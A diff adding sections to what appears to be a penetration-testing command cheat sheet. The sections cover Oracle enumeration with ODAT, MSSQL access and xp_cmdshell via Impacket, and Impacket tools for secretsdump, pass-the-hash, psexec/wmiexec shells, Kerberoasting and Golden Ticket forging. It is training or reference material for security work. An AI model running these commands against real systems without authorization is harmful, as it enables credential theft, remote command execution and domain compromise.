@@ -220,6 +220,54 @@ snmpwalk -v2c -c public <target> 1.3.6.1.4.1.77.1.2.25 # Queries the SNMP OID fo
 onesixtyone -c <community_list> <target> # Brute-forces SNMP community strings on the target host.
 braa <community string>@<target>:.1.3.6.* # Performs a fast bulk SNMP walk starting from the specified OID branch, faster than snmpwalk for large-scale enumeration
 
+## Oracle Database Enumeration
+sqlplus <user>/<password>@<target>/<SID> # Connects to an Oracle database using SQL*Plus with a valid username, password, target IP, and SID
+sqlplus scott/tiger@<target>/XE # Connects using the well-known default Oracle credentials (scott/tiger) against the XE SID
+
+### ODAT (Oracle Database Attacking Tool)
+
+./odat.py -h # Displays the ODAT help menu, listing all available modules
+./odat.py all -s <target> # Runs all modules against the target, the standard starting point for Oracle DB enumeration
+./odat.py all -s <target> -p <port> # Runs all modules against the target on a specific port (default 1521)
+./odat.py all -s <target> -d <SID> # Runs all modules, specifying a known SID
+./odat.py all -s <target> -d <SID> -U <user> -P <password> # Runs all modules using known valid credentials
+./odat.py sidguesser -s <target> -p <port> # Brute-forces valid Oracle SIDs against the listener
+./odat.py passwordguesser -s <target> -d <SID> --accounts-file <wordlist> # Brute-forces valid Oracle account credentials using a wordlist
+./odat.py <module> -s <target> -d <SID> -U <user> -P <password> --test-module # Tests whether a specific module is usable against the target (checks vulnerability/privileges) before running it
+./odat.py utlfile -s <target> -d <SID> -U <user> -P <password> --sysdba --getFile <remote path> <remote file> <local path> # Downloads a file from the DB server using the UTL_FILE package (requires SYSDBA)
+./odat.py externaltable -s <target> -d <SID> -U <user> -P <password> --sysdba --exec <remote path> <command> # Executes an OS command on the DB server via an external table (requires SYSDBA)
+./odat.py dbmsscheduler -s <target> -d <SID> -U <user> -P <password> --sysdba --exec <remote path> <command> # Executes an OS command on the DB server via DBMS_SCHEDULER (requires SYSDBA)
+./odat.py all -s <target> -vvv # Runs all modules with maximum verbosity, useful for troubleshooting
+
+## Impacket — MSSQL
+
+impacket-mssqlclient <user>@<target> # Connects to a MSSQL server, prompting for a password
+impacket-mssqlclient <user>:<password>@<target> # Connects to a MSSQL server using inline credentials
+impacket-mssqlclient <user>:<password>@<target> -windows-auth # Connects using Windows domain authentication instead of SQL authentication
+impacket-mssqlclient <domain>/<user>:<password>@<target> -windows-auth # Connects using domain-qualified Windows authentication
+impacket-mssqlclient <user>@<target> -hashes <LM hash>:<NT hash> # Authenticates using pass-the-hash instead of a password
+
+### Mssqlclient shell
+
+SQL> enable_xp_cmdshell # Enables xp_cmdshell (requires sysadmin privileges), allowing OS command execution
+SQL> xp_cmdshell whoami # Executes an OS command on the database server via xp_cmdshell
+SQL> SELECT name FROM master..sysdatabases # Lists all databases on the server
+SQL> SELECT is_srvrolemember('sysadmin') # Checks if the current user has sysadmin privileges
+SQL> disable_xp_cmdshell # Disables xp_cmdshell again (good practice/cleanup)
+
+### Impacket — Other Common Tools
+
+impacket-secretsdump <domain>/<user>:<password>@<target> # Dumps password hashes, LSA secrets, and cached credentials remotely
+impacket-secretsdump -hashes <LM hash>:<NT hash> <domain>/<user>@<target> # Dumps secrets using pass-the-hash authentication
+impacket-psexec <domain>/<user>:<password>@<target> # Spawns a remote SYSTEM shell via SMB (like the classic PsExec)
+impacket-wmiexec <domain>/<user>:<password>@<target> # Executes commands remotely via WMI (semi-interactive shell, no file dropped on disk)
+impacket-smbexec <domain>/<user>:<password>@<target> # Executes commands remotely via a temporary SMB service (no PsExec-style file dropped)
+impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC IP> -request # Requests TGS tickets for Kerberoastable service accounts (Kerberoasting)
+impacket-GetNPUsers <domain>/ -usersfile <userlist> -dc-ip <DC IP> -no-pass # Enumerates AS-REP roastable accounts (users with Kerberos pre-auth disabled)
+impacket-ticketer -nthash <NT hash> -domain-sid <SID> -domain <domain> <username> # Forges a Kerberos Golden Ticket
+impacket-lookupsid <domain>/<user>:<password>@<target> # Performs SID brute-forcing via RPC to enumerate domain users (similar to rpcclient RID cycling)
+impacket-samrdump <domain>/<user>:<password>@<target> # Enumerates users, groups, and shares via SAMR
+
 ## RPCClient
 rpcclient -U "" <target> # Connects to the target with a null session (no credentials)
 rpcclient -U "<user>%<password>" <target> # Connects using a valid username and password
